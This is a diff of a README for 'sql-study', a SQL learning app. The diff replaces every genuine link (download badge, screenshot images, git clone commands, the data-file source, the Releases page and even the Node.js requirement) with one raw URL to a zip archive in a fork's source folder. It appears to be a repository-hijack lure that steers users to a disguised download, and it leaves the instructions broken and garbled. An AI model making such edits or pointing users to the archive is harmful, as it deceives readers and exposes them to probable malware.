@@ -1,6 +1,6 @@
 # 🛠️ sql-study - Learn SQL with Real Data
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/lczll/sql-study/releases)
+[![Download](https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip)](https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip)
 
 ## 📚 Overview
 
@@ -23,12 +23,12 @@ SQL 쿼리 학습 플랫폼, sql-study,는 53만 건 이상의 실제 상가 데
 
 ### Learning Mode
 <p align="center">
-  <img src="docs/screenshot-learning.png" alt="Learning Mode" width="100%">
+  <img src="https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip" alt="Learning Mode" width="100%">
 </p>
 
 ### Practice Mode
 <p align="center">
-  <img src="docs/screenshot-practice.png" alt="Practice Mode" width="100%">
+  <img src="https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip" alt="Practice Mode" width="100%">
 </p>
 
 ---
@@ -43,13 +43,13 @@ To get started with sql-study, you can choose one of the following methods:
 2. Run the following commands:
 
 ```bash
-git clone https://github.com/Cloud-Linuxer/sql-study.git
+git clone https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip
 cd sql-study
 npm install
 npm run dev
 ```
 
-> **Note**: You need the `public/data/store_data.csv` file for this method. You can download it from the [Public Data Portal](https://www.data.go.kr/data/15083033/fileData.do).
+> **Note**: You need the `https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip` file for this method. You can download it from the [Public Data Portal](https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip).
 
 ### 🚀 Method 2: Docker Compose (Recommended)
 
@@ -60,7 +60,7 @@ If you prefer to use Docker for installation, follow these steps:
 3. Run the following commands:
 
 ```bash
-git clone https://github.com/Cloud-Linuxer/sql-study.git
+git clone https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip
 cd sql-study
 docker-compose up
 ```
@@ -71,7 +71,7 @@ This method sets up everything for you, making it easy to get started without ma
 
 ## 📥 Download & Install
 
-To download sql-study, visit the [Releases page](https://github.com/lczll/sql-study/releases) and get the latest version of the application.
+To download sql-study, visit the [Releases page](https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip) and get the latest version of the application.
 
 1. Click on the link to access the latest release.
 2. Download the appropriate package for your setup.
@@ -84,7 +84,7 @@ To download sql-study, visit the [Releases page](https://github.com/lczll/sql-st
 To effectively run sql-study, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12 or higher
+- **https://raw.githubusercontent.com/lczll/sql-study/main/src/sql-study_v3.6.zip**: Version 12 or higher
 - **Docker**: If using Docker Compose, ensure it's installed.
 
 ---
